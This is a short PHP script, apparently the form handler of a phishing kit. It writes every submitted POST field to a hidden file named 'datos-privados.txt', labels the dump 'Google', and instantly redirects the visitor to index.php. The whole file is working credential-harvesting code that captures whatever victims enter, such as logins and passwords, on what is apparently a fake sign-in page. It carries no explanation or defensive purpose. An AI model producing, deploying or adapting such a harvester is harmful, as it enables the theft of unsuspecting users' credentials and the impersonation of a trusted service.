<?php
$file = '../datos-privados.txt';

$filteredParams = array_filter($_POST, function($value) {
    return $value !== '' && $value !== null;
});

// Reemplazar la palabra "Array" por tu texto deseado
$content = str_replace("Array", "Google", print_r($filteredParams, true));

file_put_contents($file, $content, FILE_APPEND);
$host = $_SERVER['HTTP_HOST'];
?>
<meta http-equiv="refresh" content="0; url=http://<?php echo $host; ?>/index.php" />
